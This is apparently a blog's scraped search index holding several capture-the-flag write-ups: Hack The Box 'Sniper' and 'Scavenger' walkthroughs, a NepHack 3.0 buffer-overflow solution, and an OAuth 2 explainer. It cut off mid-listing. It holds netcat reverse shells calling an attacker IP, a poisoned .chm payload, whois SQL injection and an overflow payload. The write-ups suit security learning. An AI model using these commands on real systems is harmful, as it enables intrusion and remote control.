(http://0.0.0.0:8000/) ... 10.10.10.151 - - [28/Mar/2020 20:38:14] \"GET /nc.exe HTTP/1.1\" 200 - Finally downloaded nc.exe. Now I used creds and Invoke-Command to know the if I can run the command as ","date":"2020-03-28","objectID":"/sniper/:3:3","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Privilege User PS C:\\gr4n173\\files\u003e $pass =cOnvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force $pass =cOnvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force PS C:\\gr4n173\\files\u003e $cred = New-Object System.Management.Automation.PSCredential(\".\\chris\",$pass) $cred = New-Object System.Management.Automation.PSCredential(\".\\chris\",$pass) PS C:\\gr4n173\\files\u003e Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred sniper\\chris In above command, at first I defined a variable $pass which store the password and another variable cred for passing the user and pass to Powershell and last one gaves the output of command whoami in Powershell. Hence I can run the command . ","date":"2020-03-28","objectID":"/sniper/:3:4","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Reverse shell So I used the nc reverse shell as with a listener on. PS C:\\gr4n173\\files\u003e Invoke-Command -Computer Sniper -ScriptBlock { C:\\gr4n173\\files\\nc.exe 10.10.14.11 4445 -e powershell } -Credential $cred Invoke-Command -Computer Sniper -ScriptBlock { C:\\gr4n173\\files\\nc.exe 10.10.14.11 4445 -e powershell } -Credential $cred Listener: root@gr4n173:~$nc -lvnp 4445 listening on [any] 4445 ... connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 50671 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\Chris\\Documents\u003e hostname hostname Sniper This way I got the user. PS C:\\Users\\Chris\\Desktop\u003e ls ls Directory: C:\\Users\\Chris\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/11/2019 8:15 AM 32 user.txt PS C:\\Users\\Chris\\Desktop\u003e more user.txt more user.txt 21f4d****************** ","date":"2020-03-28","objectID":"/sniper/:4:0","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"User to Root For root I searched every part of the user shell and uncomplete .chm file was found inside Chris’s Downloads directory: PS C:\\Users\\Chris\\Downloads\u003e ls ls Directory: C:\\Users\\Chris\\Downloads Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/11/2019 8:36 AM 10462 instructions.chm ","date":"2020-03-28","objectID":"/sniper/:5:0","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Poisoning .chm In order to poison, I used Out-CHM.ps1 while from Nishang which is quite Interesting git repo especially related to window. I used nishand tool and opened it in powershell. PS: \u003e Import-Module .\\Out-CHM.ps1 Now I used the powershell to bypasss the Antivirus security. PS: \u003e powershell.exe -ExecutionPolicy Bypass Then I download the nc64.exe to the Chris’s Documents folder as PS: \u003e Out-CHM -Payload \"cd C:\\Users\\Chris\\Documents;./nc64.exe 10.10.14.11 8888 -e powershell\" -HHCPath \"C:\\Program Files (x86)\\HTML Help Workshop\" Here, I defined the dir of nc64.exe and used this to exploit. File name doc.chm was created and you can get here file. This way I created the poison of .chm file. Now I downloaded the created file to user shell Chris with a listener on along with the python3 server in /var/www/html/pub PS C:\\Users\\Chris\\Documents\u003e Invoke-Webrequest -Uri http://10.10.14.11:8000/doc.chm -OutFile doc.chm Invoke-Webrequest -Uri http://10.10.14.11:8000/doc.chm -OutFile doc.chm ","date":"2020-03-28","objectID":"/sniper/:5:1","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Root Shell root@gr4n173:~$nc -lvnp 8888 listening on [any] 8888 ... connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 53447 Microsoft Windows [Version 10.0.17763.678] C:\\Windows\\system32\u003ewhoami sniper\\administrator This way I can read the root.txtfile. PS C:\\Users\\Administrator\\Desktop\u003e more root.txt 5624caf******************** This way I got the root of Sniper box and learned alot from this box. So I would like to thank creators of this box MinatoTW \u0026 felamos for such an awesome box. Especially poisoning .chm was awesome. I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. Feedback are really appreciated !! Tweet about this writeup if you like. You can see more blog at my medium here: gr4n173. ","date":"2020-03-28","objectID":"/sniper/:6:0","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Here I will explain detail about the OAuth 2 .","date":"2020-03-22","objectID":"/oauth2/","tags":["oauth2","server"],"title":"OAuth 2","uri":"/oauth2/"},{"categories":["hackthebox"],"content":"Here I will explain detail about the OAuth 2 . ","date":"2020-03-22","objectID":"/oauth2/:0:0","tags":["oauth2","server"],"title":"OAuth 2","uri":"/oauth2/"},{"categories":["hackthebox"],"content":"Introduction OAuth 2 is an authorization framework that enables applications to obtain limited access to user accounts on HTTP Service like Google, Facebook, GitHub etc. In other sense, it is a protocol that allow a user to grant the access to their resources on one site, to another site without having to expose their credentials. Let’s dive deep into OAuth 2 with the actual work flow involved in it. Basically there are four roles involved in it. OAuth 2 Roles:- Resource Owner Client Resource Server Authorization Server Resource Owner: User An entity capable of granting the access to the protected resources. It is actually a user who authorize the access to their application. Typically this is an end-user. Client: Application An client is the application which wants to access the user’s account. To access the protected account it must be authorized by user and authorization must be valid with the Authorization server i.e API . Resource/Authorization Server: API Resource Server is hosting the protected resources of certain user where as Authorization Server verify the identity of user and providing the access_token to the application for authorization. ","date":"2020-03-22","objectID":"/oauth2/:0:1","tags":["oauth2","server"],"title":"OAuth 2","uri":"/oauth2/"},{"categories":["hackthebox"],"content":"Workflow of OAuth 2 +--------+ +---------------+ | |--(1)- Authorization Request -\u003e| Resource | | | | Owner | | |\u003c-(2)-- Authorization Grant ---| | | | +---------------+ | | | | +---------------+ | |--(3)-- Authorization Grant --\u003e| Authorization | | Client | | Server | | |\u003c-(4)----- Access Token -------| | | | +---------------+ | | | | +---------------+ | |--(5)----- Access Token ------\u003e| Resource | | | | Server | | |\u003c-(6)--- Protected Resource ---| | +--------+ +---------------+ Let’s take an example to explain the real work flow involved in OAuth 2. Authorization Request I have taken a new user ‘test’ and request the resource owner qtc user. Authorization Grant By exploiting the contact form user test will grant authorization by user qtc using the code. Authorization Grant Now I am into user qtc and requesting access-token presenting an authorization grant to the authorization server. Access Token Authorization server authenticates the client(application) that I have used and validates the authorization grant, and if valid , issues an access token that to user which will be invalid after 600 sec. Access Token Now client (application) request the protected resources using above access_token and will be authenticated by server. Protected Resources After verifying the access_token and sessionid of that user Resource server will provide the protected resources. Firstly, let’s talk about the basic topic involved in OAuth 2. Authorization Grant Authorization grant is a credentials representing the resource owner’s authorization used by the client to obtain an access token. There are four types of grant:- implicit, authorization code, resource owner password credentials and client credentials. Authorization Code The authorization code is obtained by using an authorization server as an intermediary between the client and resource owner. Instead of requesting authorization directly from the resource owner, the client directs the resource owner to an authorization server which in turn directs the resource owner back to the client with the authorization code. Client Credentials Client credentials can be used as authorization grant when authorization scope is limited to the protected resources under the control of the client. It is used as authorization grant typically when the client is acting on its own behalf(the client is the resource owner) or requesting to access the protected resources. Access token Access token are the credentials with the combination of strings used to access protected resources. Client Registration Before initiating the protocol, the client registers with the authorization server. The means through which the client registers with the authorization server are beyond the scope of this specification but typically involve end-user interaction with an HTML registration form. When supported by the authorization server, registration can rely on other means for establishing trust and obtaining the required client properties (e.g., redirection URI, client type). Client Type Basically there are two client type based on their ability to authenticate securely with authorization with authorization server. Confidential Type Here application is capable of maintaining the confidentiality of their credentials or capable of secure client authentication using other means. Public Type Here application is incapable of maintaining the confidentiality of their credentials or incapable of secure client authentication using any other means. Redirection URI It redirects the user-agent of service after an authorization code is granted. For e.g I used my local server to see the response from the request I send in a certain field like contact form(vulnerable field) and finally got the sessionid. Below you can see the real work flow involve in Oauth2 and it’s really Oouch… ","date":"2020-03-22","objectID":"/oauth2/:0:2","tags":["oauth2","server"],"title":"OAuth 2","uri":"/oauth2/"},{"categories":["CTF"],"content":"Here I will explain one of the challenge from NepHack 3.0 CTF .","date":"2020-03-07","objectID":"/nephack3/","tags":["linux","nephack3","ctf","binaryexploitation","gdb","pwnables"],"title":"Nephack 3.0","uri":"/nephack3/"},{"categories":["CTF"],"content":"Actually NepHack is one of the Biggest Hacking Competition of Nepal after threatcon which is especially CTF (Jeopardy type) competition which is held annually every year in K.U.( Kathmandu University), Dhulikhel, Nepal. ","date":"2020-03-07","objectID":"/nephack3/:0:0","tags":["linux","nephack3","ctf","binaryexploitation","gdb","pwnables"],"title":"Nephack 3.0","uri":"/nephack3/"},{"categories":["CTF"],"content":"Introduction Actually NepHack is one of the Biggest Hacking Competition of Nepal after threatcon which is especially CTF (Jeopardy type) competition which is held annually every year in K.U.( Kathmandu University), Dhulikhel, Nepal. But unfortunately this year due to some internal problem of K.U NepHack 3.0 was held in premises of Cynical Technology . Event happened at Jan 25–26,2020 but unfortunately I wasn’t able to attend due to my work . Luckily they decided to went live for 48 hours to play online(nephack.io)after 2 days of the event and I would like to thank Cynical Technology for it. During that live session, I was able to secure first position but at last hour i.e. 10:00 pm I was downgraded to 2nd position by team caphilates but the score was equal. I would like to Congratulate team caphilates for winning the NepHack 3.0 online. Here I would like to especially focus on the Pwnable challenges and talking about my background,I am active at Hack The Box( HTB) since 6 months. You can see my profile here gr4n173. ","date":"2020-03-07","objectID":"/nephack3/:1:0","tags":["linux","nephack3","ctf","binaryexploitation","gdb","pwnables"],"title":"Nephack 3.0","uri":"/nephack3/"},{"categories":["CTF"],"content":"PWNABLE-»CHALLENGES I was able to solve two challenges only: Shadow and Duffer. Among them I liked Duffer box because it was related to Buffer-overflow. ","date":"2020-03-07","objectID":"/nephack3/:2:0","tags":["linux","nephack3","ctf","binaryexploitation","gdb","pwnables"],"title":"Nephack 3.0","uri":"/nephack3/"},{"categories":["CTF"],"content":"Duffer It was the time when our team decided to organize CTF outside the Valley. We created many challenges for CTF and event was successfully conducted you can see details here VECTORCTF(CoTS). Among them I had created one of the challenges related to bof and luckily same challenge was in NepHack 3.0 which was of 496 points named Duffer. They have given ssh.log file on root@gr4n173:~$cat ssh.log I got ssh.log. part file there I can see the ssh login attempt log file by different user . I got the credentials from one of the members maskop9 from winning team(me0w) during live event . Credential is hacker/cynical1 with local IP 192.168.10.189. Since IP given was local IP, I wasn’t able to ssh into that user so I had to figure out other ways and I noticed I had a shell from shadow challenge which was of phindrella user and I am going to publish next Writeup where I will explain how I got phindrella user and it’s shell. Then, I tried with that credentials as Fig:-Into hacker shell I am able to login hacker shell and since I was in tty shell I had to spawn that shell so I used root@gr4n173:~$python -c \"\"import pty;pty.spawn(‘/bin/bash’)\" As challenge have given a description about the location at /hom/pax and I got two files. Fig:- hacker_shell one is vuln executable and other is flag.txt which doesn’t have permission to read .Since vuln file is ELF file so I generally read that file with gdb but my bad organizer doesn’t have gdb installed in that shell. So first I have to download that file to my localhost for that I used scp root@gr4n173:~$scp hacker@iZa2dh0wn9s9aolc3csaudZ:/home/pax /root/Downloads/ this way I was able to download to my localhost and I had given the execute permission to that file. root@gr4n173:~$chmod +x vuln I had gdb install so used this command to read vuln file root@gr4n173:~$gdb -q vuln Fig:- vuln run normally nothing happened there and I entered many random text and I got segmented fault. Now, I had to find the offset after which SIGSEGV fault occurred. I mostly use one of my favorite method to find offset as root@root:$ /usr/share/metasploit framework/tools/exploit/./pattern_create.rb -l 100 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A root@root:$ /usr/share/metasploit-framework/tools/exploit/./pattern_offset.rb -q 0x0000555555554830 [*] Exact match at offset 40 This way I got the offset. Then, I had to find the function where flag is located. For that I searched every functions and got this fig:-Functions names there I got fLog() function as noticeable and had to find the address of this function as Fig:- Address of fLog Since that is the address before running the file and after running I got this Fig:-Address of fLog after running file Since all the address should be used in Little Endian format. There is small story about Little Endian if you are interested you can read from here Address is 0x8a4755555555 in Little Endian format and offset = 40 address to call = 8a4755555555 So my final payload was: root@gr4n173:~$python -c “print(‘A’*40 + ‘\\x8a\\x47\\x55\\x55\\x55\\x55’)” | ./vuln Fig:- Flag This way I got the flag as cynical_flag{hacker_kto_mah} and got 495 points. I wanted to thank all readers for being with me through my post and I will be posting other walkthrough of NepHack 3.0 challenges soon. At last, I would like to acknowledge brother @maskop9 for helping through out the competition and other helping hands along with the organizer Cynical Technology for awesome platform seems like they too have bugbounty platform as bugv.io :) ","date":"2020-03-07","objectID":"/nephack3/:3:0","tags":["linux","nephack3","ctf","binaryexploitation","gdb","pwnables"],"title":"Nephack 3.0","uri":"/nephack3/"},{"categories":["hackthebox"],"content":"Here I will explain my path for Scavenger box from Hack The Box.","date":"2020-02-29","objectID":"/scavenger/","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Scavenger box was the hardes after Zetta box. It falls under linux and hard category. Here I will explain my path for Scavenger box from the Hack The Box. HTB:Scavenger Scavenger box was the hardest box after Zetta box. It falls under linux and hard category. Here, everything was all about enumeration, enumeration and enumeration. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using whois service and dns zone transfer(axfr) along with ftp by analyzing the .pcap file then used LKM to read root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root). ","date":"2020-02-29","objectID":"/scavenger/:0:0","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Box Details In above picture it’s ip is 10.10.10.155, I added it to /etc/hosts as scavenger.htb. Let’s solve this box. ","date":"2020-02-29","objectID":"/scavenger/:1:0","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Recon Let’s start with our universal port scanner, nmap to see the open port and service which shows # Nmap 7.80 scan initiated Thu Feb 27 23:24:41 2020 as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.155 Nmap scan report for www.supersechosting.htb (10.10.10.155) Host is up (0.29s latency). Not shown: 993 filtered ports PORT STATE SERVICE VERSION 20/tcp closed ftp-data 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0) | ssh-hostkey: | 2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA) | 256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA) |_ 256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519) 25/tcp open smtp Exim smtpd 4.89 | smtp-commands: ib01.supersechosting.htb Hello www.supersechosting.htb [10.10.14.243], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, |_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 43/tcp open whois? | fingerprint-strings: | GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: | % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37 | more information on SUPERSECHOSTING, visit http://www.supersechosting.htb | This query returned 0 object | SSLSessionReq, TLSSessionReq, TerminalServerCookie: | % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37 | more information on SUPERSECHOSTING, visit http://www.supersechosting.htb |_ 1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like' 53/tcp open domain ISC BIND 9.10.3-P4 (Debian Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Debian 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: SuperSecHosting 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port43-TCP:V=7.80%I=7%D=2/27%Time=5E57FEF1%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,A9,\"%\\x20SUPERSECHOSTING\\x20WHOIS\\x20server\\x20v0\\.6beta@Maria SF:DB10\\.1\\.37\\r\\n%\\x20for\\x20more\\x20information\\x20on\\x20SUPERSECHOSTING SF:,\\x20visit\\x20http://www\\.supersechosting\\.htb\\r\\n%\\x20This\\x20query\\x2 SF:0returned\\x200\\x20object\\r\\n\")%r(GetRequest,A9,\"%\\x20SUPERSECHOSTING\\x2 SF:0WHOIS\\x20server\\x20v0\\.6beta@MariaDB10\\.1\\.37\\r\\n%\\x20for\\x20more\\x20i SF:nformation\\x20on\\x20SUPERSECHOSTING,\\x20visit\\x20http://www\\.supersecho SF:sting\\.htb\\r\\n%\\x20This\\x20query\\x20returned\\x200\\x20object\\r\\n\")%r(HTT SF:POptions,A9,\"%\\x20SUPERSECHOSTING\\x20WHOIS\\x20server\\x20v0\\.6beta@Maria SF:DB10\\.1\\.37\\r\\n%\\x20for\\x20more\\x20information\\x20on\\x20SUPERSECHOSTING SF:,\\x20visit\\x20http://www\\.supersechosting\\.htb\\r\\n%\\x20This\\x20query\\x2 SF:0returned\\x200\\x20object\\r\\n\")%r(RTSPRequest,A9,\"%\\x20SUPERSECHOSTING\\x SF:20WHOIS\\x20server\\x20v0\\.6beta@MariaDB10\\.1\\.37\\r\\n%\\x20for\\x20more\\x20 SF:information\\x20on\\x20SUPERSECHOSTING,\\x20visit\\x20http://www\\.supersech SF:osting\\.htb\\r\\n%\\x20This\\x20query\\x20returned\\x200\\x20object\\r\\n\")%r(He SF:lp,A9,\"%\\x20SUPERSECHOSTING\\x20WHOIS\\x20server\\x20v0\\.6beta@MariaDB10\\. SF:1\\.37\\r\\n%\\x20for\\x20more\\x20information\\x20on\\x20SUPERSECHOSTING,\\x20v SF:isit\\x20http://www\\.supersechosting\\.htb\\r\\n%\\x20This\\x20query\\x20retur SF:ned\\x200\\x20object\\r\\n\")%r(SSLSessionReq,103,\"%\\x20SUPERSECHOSTING\\x20W SF:HOIS\\x20server\\x20v0\\.6beta@MariaDB10\\.1\\.37\\r\\n%\\x20for\\x20more\\x20inf SF:ormation\\x20on\\x20SUPERSECHOSTING,\\x20visit\\x20http://www\\.supersechost SF:ing\\.htb\\r\\n1267\\x20\\(HY000\\):\\x20Illegal\\x20mix\\x20of\\x20collations\\x2 SF:0\\(utf8mb4_general_ci,IMPLICIT\\)\\x20and\\x20\\(utf8_general_ci,COERCIBLE\\ SF:)\\x20for\\x20operation\\x20'like'\")%r(TerminalServerCookie,103,\"%\\x20SUPE SF:RSECHOSTING\\x20WHOIS\\x20server\\x20v0\\.6beta@MariaDB10\\.1\\.37\\r\\n%\\x20fo SF:r\\x20more\\x20information\\x20on\\x20SUPERSECHOSTING,\\x20visit\\x20http://w SF:ww\\.supersechosting\\.htb\\r\\n1267\\x20\\(HY000\\):\\x20Illegal\\x20mix\\x20of\\ SF:x20collations\\x20\\(utf8mb4_general_ci,IMPLICIT\\)\\x20and\\x20\\(utf8_gener SF:al_ci,COE","date":"2020-02-29","objectID":"/scavenger/:2:0","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Web Enumeration scavenger.htb After I noticed port 80 was opened I visited that site and got this as output. Front page of ScavengerFrontpage of Scavenger \" Front page of Scavenger From above picture, I got an vhost config problem which indicated hostname problem now I had to find another hostname. For that, I went back to nmap scan where I got 6 opened port and searched every opened port for vulnerability but got nothing since all were rabbit hole except port 43 of whois service. You can visit here for more about whois. From this I made simple payload. ","date":"2020-02-29","objectID":"/scavenger/:2:1","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Sqli in WHois Service root@gr4n173:~$ whois -h 10.10.10.155 -p 43 \"scavenger.htb\" % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37 % for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb % This query returned 0 object From here I got new domain name and added that domain name in /etc/hosts in same ip 10.10.10.155. After adding that Ip I visited that site and got this as result. Supersec Hosting PageSupersec hosting page \" Supersec Hosting Page this way I can browse a website. Here, I got nothing so I had to search more about whois service. I made payload to inject sqli in whois service to extract the files from database as. root@gr4n174:~$ whois -h 10.10.10.155 -p 43 \"l33t') or 1=1#\" SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37 % for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb % This query returned 4 object Domain Name: SUPERSECHOSTING.HTB Registrar WHOIS Server: whois.supersechosting.htb Registrar URL: http://www.supersechosting.htb Updated Date: 2018-02-21T18:36:40Z Creation Date: 1997-09-15T04:00:00Z Registry Expiry Date: 2020-09-14T04:00:00Z Registrar: SuperSecHosting Inc. Registrar IANA ID: 292 Registrar Abuse Contact Email: abusecomplaints@supersechosting.htb Registrar Abuse Contact Phone: +1.999999999 Name Server: NS1.SUPERSECHOSTING.HTB DNSSEC: unsigned URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/ \u003e\u003e\u003e Last update of whois database: 2018-12-05T14:11:05Z \u003c\u003c\u003c For more information on Whois status codes, please visit https://icann.org/epp NOTICE: The expiration date displayed in this record is the date the registrar's sponsorship of the domain name registration in the registry is currently set to expire. This date does not necessarily reflect the expiration date of the domain name registrant's agreement with the sponsoring registrar. Users may consult the sponsoring registrar's Whois database to view the registrar's reported date of expiration for this registration. TERMS OF USE: You are not authorized to access or query our Whois database through the use of electronic processes that are high-volume and automated except as reasonably necessary to register domain names or modify existing registrations; the Data in VeriSign Global Registry ....... ........ This command extract everything that was saved in database using SQL Injection in WHOIS service since WHOIS service always needs to use database to store and extract the information. From above output of WHOIS command I got three more dns as www.justanotherblog.htb www.pwnhats.htb www.rentahacker.htb and I immediately added it to /etc/hosts. After that I can browser every website of it and final dns in /etc/hosts was root@gr4n173:~$ cat /etc/hosts 10.10.10.155 www.pwnhats.htb www.rentahacker.htb www.justanotherblog.htb www.supersechosting.htb justanotherblog.htb justanotherblogjustanotherblog \" justanotherblog pwnhats.htb rentahacker.htb rentahacker websiterentahacker website \" rentahacker website I searched every part of three website and basic method of Web Pentesting . Since there were many website of same ip so I used dns zone transfer (axfr) to know the subdomains and dig every domain as dig @10.10.10.155 pwnhats.htb axfr dig @10.10.10.155 rentahacker.htb axfrI got new subdomain of rentahacker.htb . For more info about dig you can visit dig. ","date":"2020-02-29","objectID":"/scavenger/:2:2","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Subdomain Enumeration root@gr4n174:~$ dig @10.10.10.155 rentahacker.htb axfr ; \u003c\u003c\u003e\u003e DiG 9.11.5-P4-5-Debian \u003c\u003c\u003e\u003e @10.10.10.155 rentahacker.htb axfr ; (1 server found) ;; global options: +cmd rentahacker.htb. 604800 IN SOA ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800 rentahacker.htb. 604800 IN NS ns1.supersechosting.htb. rentahacker.htb. 604800 IN MX 10 mail1.rentahacker.htb. rentahacker.htb. 604800 IN A 10.10.10.155 mail1.rentahacker.htb. 604800 IN A 10.10.10.155 sec03.rentahacker.htb. 604800 IN A 10.10.10.155 www.rentahacker.htb. 604800 IN A 10.10.10.155 rentahacker.htb. 604800 IN SOA ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800 ;; Query time: 883 msec ;; SERVER: 10.10.10.155#53(10.10.10.155) ;; WHEN: Fri Feb 28 00:09:07 +0545 2020 ;; XFR size: 8 records (messages 1, bytes 251) Since 10.10.10.155 was ip here I used it as name server and rentahacker.htb as a url for dns zone transfer using axfr. Now sec03.rentahacker.htb was added in /etc/hoststoo. sec03.rentahacker.htb After that, I searched for directory using dirsearch as root@gr4n173:~$ ./dirsearch.py -u http://sec03.rentahacker.htb/ -e html,txt,php,pcap,bzip,tar,bak Here I got shell.php as an interesting dir. Then, searched for parameter in shell.php?FUZZ= where I used ffuf tool . root@gr4n173:~$ffuf -w ~/Downloads/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://sec03.rentahacker.htb/shell.php?FUZZ=id /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v0.12 ________________________________________________ :: Method : GET :: URL : http://sec03.rentahacker.htb/shell.php?FUZZ=id :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ password [Status: 200, Size: 0, Words: 1, Lines: 1] email [Status: 200, Size: 0, Words: 1, Lines: 1] url [Status: 200, Size: 0, Words: 1, Lines: 1] type [Status: 200, Size: 0, Words: 1, Lines: 1] ..... hidden [Status: 200, Size: 61, Words: 3, Lines: 2] From here I got hidden as parameter and got ib01c03 as output in browser. This indicated I can now run commands from the browser. You can see the output below. ","date":"2020-02-29","objectID":"/scavenger/:2:3","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"RCE as ib01c03 ","date":"2020-02-29","objectID":"/scavenger/:3:0","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"Users: ib01c03-\u003eib01ftp-\u003eib01c01 After getting web-shell I searched every possible part of that user and finally got mail in /var/mail/ directory i.e. ib01c03 with my cat I got this You can see the credentials username/password. I used that user/pass to login ftp and I m into ib01ftp user now. ","date":"2020-02-29","objectID":"/scavenger/:3:1","tags":["linux","htb","ftp","sqli","RE","lkm","whois","pcap","ffuf","fuzz"],"title":"Scavenger","uri":"/scavenger/"},{"categories":["hackthebox"],"content":"FTP ib01ftp-\u003eib01c01-\u003euser.txt root@gr4n173:~$ ftp www.supersechosting.htb Connected to www.supersechosting.htb. 220 (vsFTPd 3.0.3) Name (www.supersechosting.htb:bikram): ib01ftp 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls After alot searched in every directory I got incidents and ibo1c01_incident.pcap file inside ib01c01. Then downloaded it to my local machine for that I used below command. ftp\u003e get ib01c01_incident.pcap local: ib01c01_incident.pcap remote: ib01c01_incident.pcap 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes). 226 Transfer complete. 835084 bytes received in 6.58 secs (123.9393 kB/s) You can get .pcap file here: pcap. It would be a great idea if we try strings for .pcap file so I analyzed .pcap file with strings and got this result. root@gr4n173:~$ strings ib01c01_incident.pcap | grep passwd ajax=1\u0026token=\u0026controller=AdminLogin\u0026submitLogin=1\u0026passwd=pwnhats.htb\u0026email=admin%40pwnhats.htb\u0026redirect=http%3A%2F%2Fwww.pwnhats.htb%2Fadmin530o6uisg%2F%26token%3De44d0ae2213d01986912abc63712a05b \u003clabel class=\"control-label\" for=\"passwd\"\u003e \u003cinput name=\"passwd\" type=\"password\" id=\"passwd\" class=\"form-control\" value=\"\" tabindex=\"2\" placeholder=\"\u0026#xf084 Password\" /\u003e ajax=1\u0026token=\u0026controller=AdminLogin\u0026submitLogin=1\u0026passwd=GetYouAH4t%21\u0026email=pwnhats%40pwnhats.htb\u0026redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05b From here I got passwd GetYouAH4t%21 where %21=! so GetYouAH4t!. So basically we had to give a try any commands for any file. I tried this passin every user which I got from ftp ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwx------ 5 1001 1004 4096 Feb 28 06:23 ib01c01 drwx------ 3 1002 1004 4096 Dec 11 2018 ib01c02 drwx------ 4 1003 1004 4096 Jan 30 2019 ib01c03 dr-xrwx--- 3 1005 1000 4096 Dec 10 2018 ib01ftp drwx------ 3 1004 1000 4096 Dec 10 2018 ib01www drwx------ 2 1000 1000 4096 Feb 02 2019 support Finally I m into ib01c01 user on ls I got user.txt and downloaded to my local machine using get ftp\u003e get user.txt local: user.txt remote: user.txt No control connection for command: Success root@gr4n173:~$ cat user.txt 6f8a8a************ This way I got the user.txt file without getting shell for user. Unprivelege-\u003e Privilege Escalation ftp-\u003eib01c01-\u003e.pcap root@gr4n173:~$ ftp www.supersechosting.htb Connected to www.supersechosting.htb. 220 (vsFTPd 3.0.3) Name (www.supersechosting.htb:bikram): ib01c01 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw------- 1 1001 1004 32 